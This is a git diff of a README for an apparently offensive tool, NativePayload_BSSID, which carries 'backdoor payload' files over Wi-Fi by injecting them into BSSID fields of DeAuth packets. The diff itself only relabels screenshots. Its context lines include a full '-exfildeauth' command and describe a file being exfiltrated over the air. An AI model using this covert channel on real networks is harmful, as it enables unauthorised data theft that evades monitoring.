@@ -66,6 +66,7 @@ Note: before step1 you should make WlanXmon Monitor-Mode Interface by this comma
 
 
 ![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20Step1.png)
+Picture 2:
 
 Step 2 :
 with Step2 your Client (system A) will send that text file to (Target/system B) via DeAuth Packets On AIR Directly...
@@ -75,10 +76,12 @@ note: via Step2 your Payload Injected to Client.BSSIDs in DeAuth Packets.
     Example [System A]:./NativePayload_BSSID.sh -exfildeauth mypayload.txt 00:12:32:44:64:19 wlan2 7 faster
 
 ![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20Step2.png)
+Picture 3:
 
-as you can see in "Picture 3" after 5 seconds that text file "3.txt" Exfiltrated from client to server on AIR ,(very simple).
+as you can see in "Picture 4" after 5 seconds that text file "3.txt" Exfiltrated from client to server on AIR ,(very simple).
 
 ![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20Step4.png)
+Picture 4:
 
 Article and Pdf File will Publish here soon...
 
